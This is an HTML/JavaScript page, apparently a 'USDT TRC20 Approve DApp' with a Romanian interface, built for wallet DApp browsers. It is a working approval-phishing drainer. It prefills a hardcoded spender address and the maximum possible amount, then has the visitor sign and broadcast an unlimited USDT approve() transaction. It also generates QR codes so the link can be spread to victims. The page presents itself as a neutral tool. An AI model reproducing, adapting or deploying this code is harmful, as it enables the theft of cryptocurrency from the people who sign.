<!doctype html>
<html lang="ro">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>USDT TRC20 Approve DApp</title>

<style>
body { font-family: system-ui; background:#0b0f14; color:#fff; padding:20px; }
.card { max-width:520px; margin:auto; background:#121824; padding:20px; border-radius:14px; }
input { width:100%; padding:10px; margin-top:6px; margin-bottom:12px; border-radius:6px; border:none; }
button { width:100%; padding:12px; margin-top:10px; border-radius:8px; cursor:pointer; }
#status { font-weight:600; margin-bottom:10px; }
.small { font-size:12px; opacity:0.7; }
hr { border:0; border-top:1px solid #2a2a2a; margin:15px 0; }
.warn { color:#ffcc00; font-size:12px; margin-bottom:10px; }
#qr canvas { margin-top:10px; }
</style>
</head>

<body>

<div class="card">

<h2>USDT TRC20 Approve DApp</h2>

<div id="status">Aștept wallet...</div>

<div class="warn">
⚠️ Deschide în Trust Wallet / TronLink DApp browser
</div>

<hr>

<label>Token</label>
<input id="token" />

<label>Spender</label>
<input id="spender" />

<label>Value</label>
<input id="value" />

<button id="connectBtn">Connect Wallet</button>
<button id="approveBtn" disabled>Confirm & Sign</button>

<hr>

<button id="genQrBtn">Generează QR</button>
<button id="downloadQrBtn">Descarcă QR</button>

<div id="qr"></div>

<hr>

<div class="small" id="walletInfo">Not connected</div>

</div>

<script src="https://unpkg.com/tronweb/dist/TronWeb.js"></script>
<script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>

<script>
const USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";

const el = id => document.getElementById(id);
const status = t => el("status").innerText = t;

let tronWeb;
let user;

const DEFAULT_SPENDER = "TN3ssBQjMsjsTyJKGL1hL7czsQjrjpePGu";
const DEFAULT_VALUE = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

// ---- URL PARAMS (QR SUPPORT)
function getParams(){
  const p = new URLSearchParams(location.hash.replace("#",""));
  return {
    token: p.get("token"),
    spender: p.get("spender"),
    value: p.get("value")
  };
}

const p = getParams();

el("token").value = USDT;
el("spender").value = p.spender || DEFAULT_SPENDER;
el("value").value = p.value || DEFAULT_VALUE;

// ---- WAIT WALLET
function waitWallet(){
  return new Promise((res, rej)=>{
    let t=0;
    const i=setInterval(()=>{
      if(window.tronWeb && window.tronWeb.defaultAddress?.base58){
        clearInterval(i);
        res(window.tronWeb);
      }
      t+=300;
      if(t>15000){
        clearInterval(i);
        rej();
      }
    },300);
  });
}

// ---- CONNECT
el("connectBtn").onclick = async ()=>{
  try{
    status("Detecting wallet...");
    tronWeb = await waitWallet();

    user = tronWeb.defaultAddress.base58;

    el("walletInfo").innerText = "Connected: " + user;
    status("Wallet connected ✔️");

    el("approveBtn").disabled = false;

  }catch(e){
    status("Open in Trust Wallet DApp browser");
  }
};

// ---- APPROVE
el("approveBtn").onclick = async ()=>{
  try{
    el("approveBtn").disabled = true;

    status("Building transaction...");

    const tx = await tronWeb.transactionBuilder.triggerSmartContract(
      USDT,
      "approve(address,uint256)",
      { feeLimit: 100000000 },
      [
        { type:"address", value: el("spender").value },
        { type:"uint256", value: el("value").value }
      ],
      user
    );

    if(!tx.transaction) throw new Error("TX build failed");

    status("Signing...");

    const signed = await tronWeb.trx.sign(tx.transaction);

    status("Sending...");

    const result = await tronWeb.trx.sendRawTransaction(signed);

    if(result.result){
      status("SUCCESS ✔️ TX: " + result.txid);
    } else {
      throw new Error("Transaction failed");
    }

    el("approveBtn").disabled = false;

  }catch(err){
    status("Error: " + err.message);
    el("approveBtn").disabled = false;
  }
};

// ---- QR SYSTEM
const qrDiv = el("qr");
let lastCanvas = null;

function buildLink(){
  const base = location.href.split('#')[0];
  return base +
    "#token=" + el("token").value +
    "&spender=" + el("spender").value +
    "&value=" + el("value").value;
}

// generate QR
el("genQrBtn").onclick = async ()=>{
  qrDiv.innerHTML = "";

  const link = buildLink();

  const canvas = document.createElement("canvas");
  await QRCode.toCanvas(canvas, link, { width: 260 });

  qrDiv.appendChild(canvas);
  lastCanvas = canvas;
};

// download QR
el("downloadQrBtn").onclick = ()=>{
  if(!lastCanvas) return alert("Generează QR mai întâi");

  const a = document.createElement("a");
  a.href = lastCanvas.toDataURL("image/png");
  a.download = "usdt-approve-qr.png";
  a.click();
};
</script>

</body>
</html>
